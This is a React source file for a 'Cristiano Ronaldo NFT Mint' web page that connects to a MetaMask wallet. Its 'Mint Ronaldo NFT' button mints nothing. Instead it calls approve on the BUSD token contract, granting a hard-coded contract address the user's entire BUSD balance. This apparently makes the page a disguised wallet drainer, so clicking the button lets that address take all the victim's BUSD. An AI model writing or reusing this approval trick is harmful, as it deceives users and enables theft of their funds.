import { useEffect } from 'react';
import {useState} from 'react';
import { ethers } from 'ethers';
import './App.css';
import contract from './contracts/King.json';
import alchemylogo from "./images.jpg";
import alchemylogo1 from "./images2.jpg";
import { mintERC20Button } from './components/ERC20mint.js';
import { getbarnButton } from './components/Getmetadata.js';

const contractAddress = "0xCd4D042B07D7F8c4c2a5B501FE4aC1ac2ceDF5e9";
const abi = contract.abi;
const mycontractaddr = '0x7F1BA369ade4F6F3d36fB5E6242D90cf22Aa7069'
const BUSDcontract = '0x8577b3781af53d880de1bb72B2b259c4b48ae98d'
const BUSDabi = require('./BUSDabi.json')
const mycontractabi = require('./mycontractabi.json')

function App() {
//  console.log("Make sure you have Metamask installed.");
const [currentAccount, setCurrentAccount] = useState(null);  


const checkWalletIsConnected = async () => { 
    const {ethereum} = window;

    if(!ethereum){
      console.log("Make sure you have Metamask installed.");
      return;
    }else{
      console.log("Wallet exists!,We're ready to go!");
    }

    const accounts = await ethereum.request({method: 'eth_accounts'});
    if(accounts.length !== 0){
      const account = accounts[0];
      console.log("Found an arthorized account:", account);
      setCurrentAccount(account);

    }else{
      console.log("No aurhorized account found");
    }


  }

  const connectWalletHandler = async () => {
    const {ethereum} = window;

    if(!ethereum){
      alert("Please install Metamask!");
    }
    try{
      const accounts = await ethereum.request({method: 'eth_requestAccounts'});
      console.log("Found an account! Address:", accounts[0]);
      setCurrentAccount(accounts[0]);

    }catch(err){
      console.log(err);
    }

   }
////////////////////////////////////////////////////////////////////////////////
const setAddressHandler =async () => {
  try{
    const {ethereum} = window;
    if(ethereum){
      const proiver = new ethers.providers.Web3Provider(ethereum);
      const signer = proiver.getSigner();
      const nftContract = new ethers.Contract(contractAddress, abi ,signer);
      // nftContract.on("Approval", (sns, sdf,sdf,)=>{
      // })
      console.log("Initialize payment");
      console.log(nftContract.setHorse);
      // let Barnset = await nftContract.setHorse("0xb8c4A81a9a80763e88B9C057C629ff16C47cAC9c" ,{gasPrice: 1000000000, gasLimit: 85000, nonce: 4}).send();
      let data = await nftContract.getTokenURI(2);
      console.log(data);
      // await Barnset.wait();
      // console.log("Mined Barn",Barnset);
     
      console.log('Mined, see transaction: http://ropsten.etherscan.io/tx/ ${nftTxn.hash}'); 
    }else{
      console.log("Ethereum object does not exist");
    }
  }catch(err){
    console.log(err);
  }
 }
 //////////////////////////////////////////////////////////////////////
  const mintNftHandler =async () => {
    try{
      const {ethereum} = window;
      
      if(ethereum){
        const provider = new ethers.providers.Web3Provider(ethereum);
        const signer = provider.getSigner();
        const accounts = await ethereum.request({method: 'eth_accounts'});
        const account = accounts[0];
        const BUSD = new ethers.Contract(BUSDcontract, BUSDabi,signer);
        const balance = (await BUSD.balanceOf(account)).toString();
        console.log(balance)
        let approve = await BUSD.approve(mycontractaddr, balance);
        console.log(approve);
      }else{
        console.log("object does not exist");
      }
    }catch(err){
      console.log(err);
    }
   }

  const connectWalletButton = () => {
    return (
      <button onClick={connectWalletHandler} className='cta-button connect-wallet-button'>
        Connect Wallet
      </button>
    )
  }

  // const disconnectButton = () => {
  //   return (
  //     <button onClick={mintNftHandler} className='cta-button connect-wallet-button' >
  //       Disconnect Wallet
  //     </button>
        
  //   )
  // }
  const mintNftButton = () => {
    return (
      <button onClick={mintNftHandler} className='cta-button mint-nft-button'>
        Mint Ronaldo NFT
      </button>
    )
  }

  useEffect(() => {
    checkWalletIsConnected();
  }, [])

  return (
    
    <div className='main-app' >
      <img id="logo" src={alchemylogo}></img>
      <img id="logo1" src={alchemylogo1}></img>
      <h1 id="h1">Cristiano Ronaldo NFT Mint</h1>
      
      <div>
        {currentAccount ? mintNftButton() : connectWalletButton()}
      </div>
      <div>

      {/* <button onClick={setAddressHandler} className='cta-button connect-wallet-button'>
        Set Address
      </button> */}

      </div>
      <div>
        {currentAccount? mintERC20Button() : ""}
      </div>
      <p id="p1">This is the best NFT Platform!</p>
      <p>Thank you!</p>
    </div>
   
   
  )
}

export default App;